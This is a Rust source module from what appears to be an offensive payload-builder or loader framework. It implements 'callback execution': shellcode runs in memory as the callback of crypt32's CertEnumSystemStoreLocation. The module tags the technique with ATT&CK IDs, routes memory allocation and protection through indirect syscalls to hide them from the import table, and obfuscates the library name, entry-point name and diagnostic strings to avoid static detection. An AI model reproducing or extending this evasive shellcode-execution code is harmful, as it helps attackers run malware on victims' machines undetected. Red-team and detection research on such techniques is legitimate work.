//! Callback execution.
//!
//! Runs the payload as the callback of a legitimate Windows enumeration API in
//! the current process, so the code is entered from a call the system makes
//! itself instead of from a dedicated thread. See `README.md` for the full
//! write-up.

use serde::{Deserialize, Serialize};

use crate::engine::obfuscation::StringsConfig;
use crate::plan::schema::PayloadFormat;

use super::{Capability, Category, Stability, TechniqueDef};

/// Parameters for callback execution: which payload to run (the payload format
/// and export live in the payload's `build.payloads` entry).
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct Params {
    /// Name of the payload in `build.payloads` to run. Optional when the plan
    /// declares exactly one payload.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub payload: Option<String>,
}

/// Static metadata for callback execution.
pub const DEF: TechniqueDef = TechniqueDef {
    name: "execution_callbacks",
    // T1106: MITRE's own procedure examples for this shape (BOOKWORM, PUBLOAD,
    // CLAIMLOADER, TONESHELL) describe "running shellcode through the callback
    // function" of a legitimate API. T1620: the payload is executed from an
    // in-process allocation, never written to disk. T1055 does not apply — no
    // other process is touched, and its sub-techniques cover TLS callbacks and
    // window procedures, not enumeration callbacks.
    attck: &["T1106", "T1620"],
    stability: Stability::Experimental,
    requires: &[Capability::WindowsX64, Capability::WindowsX86],
    conflicts: &[],
    category: Category::Execution,
    doc_path: "src/techniques/execution_callbacks/README.md",
    stub_fragment: include_str!("stub_fragment.rs"),
    params_example: "technique: execution_callbacks\n",
    readme: include_str!("README.md"),
    // The payload region is allocated read+write and flipped to read+execute, so
    // `syscalls.mode: indirect` removes both VirtualAllocEx and VirtualProtectEx
    // from the IAT. The enumeration entry point is user32/crypt32 surface, not a
    // kernel call: it is resolved dynamically (see the fragment).
    syscalls: &["NtAllocateVirtualMemory", "NtProtectVirtualMemory"],
    // The payload is flat position-independent code: it has no import table to
    // resolve.
    resolves_imports: false,
};

/// Runtime diagnostics the fragment can emit, as `(placeholder, plaintext)`
/// pairs.
///
/// `render_fragment_for` replaces each placeholder with code that rebuilds the
/// message at runtime, so no diagnostic text lands in the generated stub's
/// `.rdata` (the same rule the other execution techniques follow).
const MESSAGES: &[(&str, &str)] = &[
    ("$MSG_EMPTY$", "the payload is empty"),
    (
        "$MSG_NOT_SHELLCODE$",
        "the payload is a PE image, which this technique cannot run: it executes flat \
         position-independent code (build.payloads.<name>.format: shellcode)",
    ),
    (
        "$MSG_ALLOC_FAILED$",
        "could not allocate the payload region",
    ),
    (
        "$MSG_PROTECT_FAILED$",
        "could not make the payload region executable",
    ),
    ("$MSG_BAD_LIBRARY_NAME$", "invalid library name"),
    ("$MSG_BAD_ENTRY_NAME$", "invalid entry point name"),
    (
        "$MSG_LIBRARY_MISSING$",
        "could not load the library that provides the callback",
    ),
    (
        "$MSG_ENTRY_MISSING$",
        "could not resolve the enumeration entry point",
    ),
    (
        "$MSG_NEVER_ENUMERATED$",
        "the enumeration never invoked the callback, so the payload did not run",
    ),
];

impl Params {
    /// Renders the callback-execution stub fragment for these parameters.
    ///
    /// The library and entry point the callback comes from, and every
    /// diagnostic, are substituted as code that rebuilds them at runtime (using
    /// `strings`'s active strategy), so none of them appears in the artifact's
    /// `.rdata`.
    ///
    /// `format` and `export` are accepted because the registry calls every
    /// Execution technique through this signature; the technique runs only
    /// `format: shellcode`, which the fragment enforces at run time (see the
    /// README's "Implementation notes").
    pub fn render_fragment_for(
        &self,
        strings: &StringsConfig,
        _format: PayloadFormat,
        _export: Option<&str>,
    ) -> String {
        let library_def = strings
            .obfuscate("crypt32.dll")
            .render_stub_expr("callback_library");
        let entry_def = strings
            .obfuscate("CertEnumSystemStoreLocation")
            .render_stub_expr("callback_entry");

        let mut rendered = DEF.stub_fragment.to_string();
        for (index, (placeholder, text)) in MESSAGES.iter().enumerate() {
            rendered = rendered.replace(
                placeholder,
                &strings
                    .obfuscate(text)
                    .render_stub_expr(&format!("msg_{index}")),
            );
        }

        rendered
            .replace("$CRYPT32_DLL_DEF$", &library_def)
            .replace("$ENUM_ENTRY_DEF$", &entry_def)
    }
}

#[cfg(test)]
mod tests;
